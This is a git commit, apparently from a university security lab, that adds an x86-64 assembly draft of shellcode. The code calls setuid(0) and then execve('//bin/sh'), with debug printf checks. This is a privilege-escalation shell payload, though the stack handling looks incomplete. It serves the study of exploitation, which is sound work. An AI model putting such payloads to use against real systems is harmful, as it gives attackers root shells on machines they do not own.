0e3ff538e0754321289ca6b7afac0577436124d4
Serafeim1781 <se.karaiskos95@gmail.com>
2017-03-24 18:26:08 +0200

    Geia Sas

---
+++ Lab1/shelltrywithprintf.asm
@@ -0,0 +1,84 @@
+extern	printf
+
+section .data
+
+msg db 'Owned!!',0xa
+fmt    db "rax=%ld", 10, 0
+
+
+section .text
+
+;global _start
+
+;_start:
+global main
+main:
+
+; setuid(uid_t uid)
+xor rax, rax	;initialise rax and rdi
+mov al, 105
+xor rdi, rdi
+syscall		; sys_setuid -- setuid(0)
+xor rax, rax	; clean rax from the returned value
+
+;;;;;;;;;;;;;;;;;;;CHECK-CODE;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+mov al,1
+mov rdi,1
+mov rsi,msg
+mov rdx,8
+syscall
+xor rdi,rdi
+xor rax, rax
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+;int execve(const char *filename, char *const argv[], char *const envp[])
+
+;push NULL  to get ready for execve the argv[] needs to terminate with NULL
+push rdi	;rdi = NULL from before
+
+;	mov rdx, rsp;rdx the 3rd arg points to NULL
+
+;push "//bin/sh" on stack to get ready for execve
+;"//bin/sh" = 2f, 2f, 62, 69,   6e, 2f, 73, 68
+
+push 0x69622f2f
+mov dword [rsp+4], 0x68732f6e
+
+mov rdi, rsp	;rdi points to the start of the string on stack
+;	mov rsi, rdi	;rsi points to the start of the array of strs ending with a null pointer
+add rsp, 16	;restore stack
+;	xor rdx, rdx	;envp[] = NULL we dont have environment something
+
+mov al, 59	;set rax for syscall
+syscall
+
+;;;;;;;;;;;;;;;;;;;CHECK-CODE;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;print retur value of execve
+push	rbp
+mov rdi, fmt
+mov rsi, rax
+xor rax, rax
+call printf
+pop	rbp
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+xor rax, rax	;clean rax from the returned value
+
+;;;;;;;;;;;;;;;;;;;CHECK-CODE;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+xor rax, rax
+mov al,1
+mov rdi,1
+mov rsi,msg
+mov rdx,8
+syscall
+xor rdi,rdi
+xor rax, rax
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+;exit(int status)
+mov al, 60	;set rax for syscall
+xor rdi, rdi	;set status on 0
+syscall
+
